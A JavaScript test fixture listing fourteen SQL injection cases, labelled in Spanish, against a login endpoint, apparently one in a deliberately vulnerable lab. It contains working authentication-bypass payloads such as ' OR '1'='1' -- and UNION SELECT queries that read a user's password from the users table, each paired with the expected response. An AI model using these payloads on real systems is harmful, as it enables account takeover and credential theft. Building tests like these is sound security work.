const cases = [
 {id:'P01',name:'Tautología de texto',username:"' OR '1'='1' --",password:'x',status:200,user:'admin'},
 {id:'P02',name:'Comentario de usuario',username:"admin'--",password:'x',status:200,user:'admin'},
 {id:'P03',name:'Tautología numérica',username:"' OR 1=1--",password:'x',status:200,user:'admin'},
 {id:'P04',name:'OR en contraseña',username:'admin',password:"' OR '1'='1",status:200,user:'admin'},
 {id:'P05',name:'Fila sintética UNION',username:"' UNION SELECT 1,'hacked','hacked'--",password:'x',status:200,user:'hacked'},
 {id:'P06',name:'Comentario no compatible',username:"admin'#",password:'x',status:500},
 {id:'P07',name:'Tautología alternativa',username:"' OR 'x'='x'--",password:'x',status:200,user:'admin'},
 {id:'P08',name:'UNION con tres NULL',username:"' UNION SELECT NULL,NULL,NULL--",password:'x',status:200,user:null},
 {id:'P09',name:'OR con usuario inexistente',username:'noexiste',password:"' OR '1'='1",status:200,user:'admin'},
 {id:'P10',name:'Comentario de bloque',username:"admin'/**/--",password:'x',status:200,user:'admin'},
 {id:'P11',name:'Selección de juan con UNION',username:"' UNION SELECT id,username,password FROM users WHERE username='juan'--",password:'x',status:200,user:'juan'},
 {id:'P12',name:'Suplantación de juan',username:"juan'--",password:'x',status:200,user:'juan'},
 {id:'P13',name:'Proyección de contraseña',username:"' UNION SELECT 1,password,'x' FROM users WHERE username='juan'--",password:'x',status:200,user:'1234'},
 {id:'P14',name:'Comilla sin cerrar',username:"admin'",password:'x',status:500}
];
module.exports = cases;
